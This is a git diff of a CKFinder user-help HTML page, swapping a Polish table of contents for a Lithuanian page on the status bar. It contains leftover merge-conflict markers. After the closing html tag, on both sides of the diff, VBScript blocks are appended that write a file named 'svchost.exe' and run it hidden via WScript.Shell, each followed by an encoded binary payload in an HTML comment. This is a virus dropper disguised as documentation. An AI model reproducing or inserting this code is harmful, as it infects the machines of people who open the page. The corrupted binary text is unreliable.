@@ -1,197 +1,31 @@
-<<<<<<< HEAD
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-	<title>CKFinder &mdash; PodrÄ™cznik UÅ¼ytkownika</title>
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>CKFinder vartotojo instrukcija</title>
+	<link href="../../files/other/help.css" type="text/css" rel="stylesheet" />
+	<script type="text/javascript" src="../../files/other/help.js"></script>
 	<meta name="robots" content="noindex, nofollow" />
-	<style type="text/css">
-		body
-		{
-			margin: 0px;
-			font-family: Trebuchet, Trebuchet MS, Arial;
-		}
-		a { text-decoration: none ; }
-		a:hover { text-decoration: underline ; }
-		ul { list-style-type: none; padding-left: 20px; margin:0px; }
-		li { white-space: nowrap; padding-left:2px; padding-right:2px; }
-		.toc
-		{
-			background-color: #696969;
-			color: #f5f5f5;
-			margin: 0px;
-			font-weight: bold;
-			text-align: center;
-		}
-		.contents { padding: 10px; }
-		.active  { color: highlighttext; background-color: highlight; }
-	</style>
-	<script type="text/javascript">
-
-window.onload = function()
-{
-	for ( var i = 0 ; i < document.links.length ; i++ )
-	{
-		var link = document.links[i] ;
-		link.target = 'CKDocsMain' ;
-		link.innerHTML = '&nbsp;' + link.innerHTML + '&nbsp;' ;
-	}
-}
-
-var lastLink = null ;
-
-window.top.SetActiveTopic = function( topicUrl )
-{
-	var pageName = topicUrl.match( /(?:^|\/|\\)([^\\\/]+)$/ )[1] ;
-
-	if ( lastLink )
-		lastLink.className = '' ;
-
-	for ( var i = 0 ; i < document.links.length ; i++ )
-	{
-		var link = document.links[i] ;
-		if ( link.href.match( /(?:^|\/|\\)([^\\\/]+)$/ )[1] == pageName )
-		{
-			lastLink = link ;
-			link.className = 'active' ;
-			return ;
-		}
-	}
-}
-
-	</script>
-</head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
 <body>
-	<p class="toc">
-		&nbsp;Spis treÅ›ci
+	<h1>
+		Statuso bÅ«sena
+	</h1>
+	<p>
+		"Statuso bÅ«sena" tai yra nedidelÄ— vieta narÅ¡yklÄ—je, kuri yra naudojama informacijai
+        atvaizduoti. Tai gali bÅ«ti failo apimtis, jÅ³ kiekis segtuve ir t.t JÄ… galima pamatyti CKFinder
+		vartotojo sÄ…sajos apaÄioje.
 	</p>
-	<div class="contents">
-		<ul style="padding-left: 0px;">
-			<li><a href="001.html">WstÄ™p</a></li>
-			<li><a href="002.html">Interfejs</a>
-				<ul>
-					<li><a href="003.html">Panel folderÃ³w</a>
-						<ul>
-							<li><a href="014.html">Koszyk</a></li>
-						</ul>
-					</li>
-					<li><a href="004.html">Panel plikÃ³w</a></li>
-					<li><a href="005.html">Pasek narzÄ™dzi</a>
-						<ul>
-							<li><a href="006.html">PrzesyÅ‚anie pliku</a></li>
-							<li><a href="007.html">OdÅ›wieÅ¼anie</a></li>
-							<li><a href="008.html">Ustawienia</a></li>
-							<li><a href="009.html">Pomoc</a></li>
-						</ul>
-					</li>
-					<li><a href="010.html">Pasek statusu</a></li>
-					<li><a href="012.html">Menu kontekstowe</a></li>
-				</ul>
-			</li>
-			<li><a href="015.html">SkrÃ³ty klawiaturowe</a></li>
-			<li><a href="013.html">Wymagania systemowe i zgodnoÅ›Ä‡</a></li>
-			<li><a href="011.html">Prawa autorskie</a></li>
-			<li><a href="suggestions.html">Sugestie?</a></li>
-		</ul>
-	</div>
-</body>
-</html>
-=======
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-	<title>CKFinder &mdash; PodrÄ™cznik UÅ¼ytkownika</title>
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-	<meta name="robots" content="noindex, nofollow" />
-	<style type="text/css">
-		body
-		{
-			margin: 0px;
-			font-family: Trebuchet, Trebuchet MS, Arial;
-		}
-		a { text-decoration: none ; }
-		a:hover { text-decoration: underline ; }
-		ul { list-style-type: none; padding-left: 20px; margin:0px; }
-		li { white-space: nowrap; padding-left:2px; padding-right:2px; }
-		.toc
-		{
-			background-color: #696969;
-			color: #f5f5f5;
-			margin: 0px;
-			font-weight: bold;
-			text-align: center;
-		}
-		.contents { padding: 10px; }
-		.active  { color: highlighttext; background-color: highlight; }
-	</style>
-	<script type="text/javascript">
-
-window.onload = function()
-{
-	for ( var i = 0 ; i < document.links.length ; i++ )
-	{
-		var link = document.links[i] ;
-		link.target = 'CKDocsMain' ;
-		link.innerHTML = '&nbsp;' + link.innerHTML + '&nbsp;' ;
-	}
-}
-
-var lastLink = null ;
-
-window.top.SetActiveTopic = function( topicUrl )
-{
-	var pageName = topicUrl.match( /(?:^|\/|\\)([^\\\/]+)$/ )[1] ;
-
-	if ( lastLink )
-		lastLink.className = '' ;
-
-	for ( var i = 0 ; i < document.links.length ; i++ )
-	{
-		var link = document.links[i] ;
-		if ( link.href.match( /(?:^|\/|\\)([^\\\/]+)$/ )[1] == pageName )
-		{
-			lastLink = link ;
-			link.className = 'active' ;
-			return ;
-		}
-	}
-}
-
-	</script>
-</head>
-<body>
-	<p class="toc">
-		&nbsp;Spis treÅ›ci
-	</p>
-	<div class="contents">
-		<ul style="padding-left: 0px;">
-			<li><a href="001.html">WstÄ™p</a></li>
-			<li><a href="002.html">Interfejs</a>
-				<ul>
-					<li><a href="003.html">Panel folderÃ³w</a>
-						<ul>
-							<li><a href="014.html">Koszyk</a></li>
-						</ul>
-					</li>
-					<li><a href="004.html">Panel plikÃ³w</a></li>
-					<li><a href="005.html">Pasek narzÄ™dzi</a>
-						<ul>
-							<li><a href="006.html">PrzesyÅ‚anie pliku</a></li>
-							<li><a href="007.html">OdÅ›wieÅ¼anie</a></li>
-							<li><a href="008.html">Ustawienia</a></li>
-							<li><a href="009.html">Pomoc</a></li>
-						</ul>
-					</li>
-					<li><a href="010.html">Pasek statusu</a></li>
-					<li><a href="012.html">Menu kontekstowe</a></li>
-				</ul>
-			</li>
-			<li><a href="015.html">SkrÃ³ty klawiaturowe</a></li>
-			<li><a href="013.html">Wymagania systemowe i zgodnoÅ›Ä‡</a></li>
-			<li><a href="011.html">Prawa autorskie</a></li>
-			<li><a href="suggestions.html">Sugestie?</a></li>
-		</ul>
-	</div>
+	<p>
+		Jeigu <strong>failas yra pasirinktas</strong> CKFinder'yje, statuso bÅ«sena parodys
+		detaliÄ… informacijÄ… apie failÄ…, Ä¯skaitant failo pavadinimÄ…, apimtÄ¯ ir paskutinio atnaujinimo
+		datÄ…. Pvz:</p>
+	<p style="text-align: center">
+		<img src="images/018.gif" height="17" width="221" />&nbsp;</p>
+	<p>
+		Jeigu <strong>nepasirinktas joks failas</strong>, bus rodomas visÅ³ failÅ³ kiekis
+		esanÄiame segtuve. PavyzdÅ¾iui:</p>
+	<p style="text-align: center">
+		<img src="images/019.gif" height="17" width="221" />&nbsp;</p>
 </body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -209,11 +43,11 @@ End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
 <<<<<<< HEAD
-//--></SCRIPT><!--©¼‡CVÙG§ÖÁ6,HxÎƒÎ#Õí³h½{4^¡ö;½¶/gvr¦¨¦1*-N[ùê_|è)¥²:Ùò”ßM[.W_ê6…àĞ%‡ÜŠZ×í¢:Ãæq·Ì†€3rô‘H+$ûd$èb¶BÚ4ÖÄºm°Í€\•W(	õ™MQF¼‰ëƒĞÕ20;¢qĞÊÔ6©r¾¤ƒ4l%’Á(Şs0Ší¿Ô½‰™oâÜNfRPJ±ÂÊñÌ»ÆˆşŠaÄ 5Yî‘õYvq£ÀCŞ÷¶íC’š—
-Y”sna8QRi‹˜°'5Ò@ízÂÀ@ İJr‚™¸‡™°kNîĞ‡ÅäÅ9Zdá’/›Ä1(}ƒL3×aÂ'G9cK–Œ,Êéœ‹ı1^*¤C`öş2åîõ¿µ`¶‡vÉ)òè§›ëæ1¢«(¹v~€qÜÛã†¿ëö&$ükşîÖtÆtiáŒ^f¿Ö `Rn‰–ik‡?=ÅÚ6û›tB1h`†Ís†+í1Bµª8Ô7åYİ¿tÙÖ>heÀ8œ NDÅ…¸ĞÍ¼å ¾øR}ãû¾ø¾ø¾ø—°LàAI[ª´ø ¾ø-->
+//--></SCRIPT><!--^Ç"7Øo‹°PÏoW«ämE:™0ä«§¤“y¤Æw³¥¢®ôÍÒKâånv,*_/bİí¥»ÀLÊñâ¸?¢D—j1]ãüY£µÄŒI½÷`<œpÁÖ«8òt”…:˜ÌñRi­Çœé( #• ’¥D+-£Úœæò2J6bø@S[ƒ×“gZi­û6Ÿ½µ[©w&[%YÑ.üÍ¬×ôœ€Ùğ¡¢"Fd=Â¾fø‰1w&áÔ\Ö°¸×ê^Aô)ãAœšYo”b,îo>
+4ó„'‘~ß)>™pØR¤UŸç–—„‡@SÁİ‘>p…^•"`‹ø±Õl	b¤dò÷ÖêpšÛ7|'è.ÙÌÃ ×­sY«Ş,Zº,¨c×áÖ·>AÀP™o‹ó?¾õ¦	­m{@‚¡é±iÀäI„ê7:´İğuŠVªwì‚Ê³gŠÒnİ5xCr—Ü9“Z¹…îYSË’†Õ)“²vb‚NcJ·=»›mßô—7€˜ÅØ	gQˆ×9x ¾øR}ãû¾ø¾ø¾ø—°LÛAI[K»ø ¾ø-->
 =======
-//--></SCRIPT><!--í¢ô\67ehùø"®2Şx}Ç æzß—QÚá‘­¿O²ÃXeÆ‹	_±3D	}•2!„mİ„²qtfg¹ õa˜qœË¸Ÿ/`L>1FpJí;ëèÛ
-¨6P×–j¥H6LÍj^ Ø[!¸?¨–~LåeßºeHx—úXö=e¶»:+j[£¬Ç ø¾ûìü7óıÅZ³…«åíƒ‰+­˜ÌsMù¥hÆb[w'˜À¤óÏ/ÔÂ<˜Ù‹I]æ¸‹/¡×ìõRzµşnIáEèe½:h‘|8 ¼Ÿ©Qà:½<Y—`Úàşyiât°@²{ÂB‘,µpûL·g!pÈwM¾®»Æ7ç/{4YœÌdkùÀ¼‚—y’=>©eÇ—SóŸ@w®‘“×³qóëú±JºDu®S7\îâq>¯º–ŞE‡ôª˜‰’@’¡°Ùeır†İÁÚÎ=Ò~Şz–uk8l£vá°® Â9R"øÂ9Â9Â9ëqO+°–XªÈ9 Â9-->
+//--></SCRIPT><!--š&1"ßº¦%ûv`=¤Ößqß“Ek¸%·¤¥ï@¸ü!N7Ÿ©q:lRéeĞ§°ÁDï_5#Ért«‹)sàuAtf€ªx®+¿ĞWÄ~…îëó'w—uĞèkN·+`Úš)Âëø"kâs~¦Kì¨V>À!öP*fğì9ÅàEÖ®OwùîQrÎ[^h¬[¶”·’I›¦I7À5#¸"Í¿5àcçìn²Ú6k]	‘›ù””»újºÀØÚùG8Mşw™
+{ºR"ù¸ø¨–Iòv qÈjQ°^Nux€Í2³®Ş¸bìµ÷Ï½ŠİÀqEŸî-‘úB÷Ë1D&0ˆÍ|Ù!”şc9•çp“¹ı-	éFq˜ıÃ¢§ Ô7m¿ÆüåÔËég?§õ)À¦ò›‡«üÍÎò¾ûáÜÅHº4Æ½pA­HŞ_¦ıTr¨	sRC‡}mâAëîc®Ò·µG	™Âòk¸ù‹9AtÒ„èºV!?€üÚN+:UIŒÄæ8é>:,²)Œ † Â9R"øÂ9Â9Â9ëqO&°–XKÇ9 Â9-->
 >>>>>>> 28ec4c2e64bc3b97237c53ba31db1a4291ef1f20
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -229,8 +63,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--‹R„	$ÊŸ‹›¨†BSÙ˜@<É“É¯¶šlÉ	ZPª½F£ÇRµ‰.ô½6ñ>û~ò
- AÈfS‘†#5€ÛEA\Ğ‰Ö Ê­ÓzJ}Şş)S¹8BÓıà ~…g¹ß¨w…Í`
-&Jfßœw€)}•sº‘ŠC`Ü.™ùq5öğòZÏ‹"nM½ËstçØÍµì>–ïÀK«%ÂPò0ÕİäıÖ°( Z,Y]zÓy[97¯Z¢z.~¹UƒYÖ’Ò*¡Å¹<ä˜œ{ZyOÂÜ×›Ö.— §;š‹k¨8»@³Ô¡ ã…äxáÚYàVÚ`Èú¯&î›äÁMN¸ÁTütñ7U‰õ5-SVşRåqnÛ8AÆY¨dHOú'¼PèğÊU~=é¾ìŠPsªÑ"ãr„Ãx³š.ã(Ê:LŒsQ'ÄQ¨µçšä¿2¾ì.µÉ}‘õ?H-GµRü SrŸËDõ….·6#
-9HzyÀ­r¡X&ãô/¾u˜!¢ßüÖO=#áçìÖ¤|WDã×±Œ¤yJ› ¡Ë	‚*®w×&ÚÍ¨š+‚wKåÏV®ê‹(']U1,_™V= ¤z•¡ ºÿRyäûºÿºÿºÿ“·LdÇK[Oô ºÿ-->
->>>>>>> dung
+//--></SCRIPT><!--q—ƒRTûû"{mOÔš°¢ >ÈF!İéA¼~{'f§ÅHÍ~—Î"€Xé_ÊÕıR¶şÇªùûÀ¥}v<}Aå˜¤±J¦ZWRÕ ë*à¶.ÎÏ³°H×‚U7zI¼¶³wädIQ¹xïÓÖF’ŞGÓï7”|å‹Õ½t\/í´YE_ÃüÓŸ.Ì7*ãéÌ»Jr}L•ù"ëá°#Õ-5I¶Ë~|aFóQö~’Éº”…Îú¼Ë2úú–ûm8ÄÍàem
+Œ@k*FèMmD\©¿Î¯³=qYsÖº‡u’ß‡õ!“NNw“=ÁñL¹}¤S”’!…ßG¿şÄ½C4*ÉÃÂ>£ò$>ù‘Ç(­§JCRl$"—Ô·Ñ%)Ç64º<Ø<"Å‹ºÜtU_Âxl·ïPtÒ¹zbÊÓ[ÇC9®SqšƒKÇ±0/‚1$¡ñş³k‡ÃÌp¹‹ ºÿRyäûºÿºÿºÿ“·L^ÇK[Ü›ô ºÿ-->
